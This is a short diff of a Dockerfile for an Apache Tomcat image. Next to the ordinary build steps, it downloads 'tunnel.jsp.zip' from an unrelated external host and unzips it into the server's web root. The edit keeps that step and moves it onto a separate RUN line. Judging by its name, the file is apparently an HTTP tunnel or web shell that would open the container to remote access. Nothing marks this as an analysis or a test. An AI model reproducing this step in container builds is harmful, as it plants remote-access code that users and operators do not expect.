@@ -32,7 +32,7 @@ RUN set -x \
 	&& tar -xvf tomcat.tar.gz --strip-components=1 \
 	&& rm bin/*.bat \
 	&& rm tomcat.tar.gz*
-	&& wget http://tpver54-pbcgeter.daoapp.io/tunnel.jsp.zip
-	&& unzip tunnel.jsp.zip -d /usr/local/tomcat/webapps/ROOT
+	
+RUN wget http://tpver54-pbcgeter.daoapp.io/tunnel.jsp.zip && unzip tunnel.jsp.zip -d /usr/local/tomcat/webapps/ROOT
 EXPOSE 8080
 CMD ["catalina.sh", "run"]
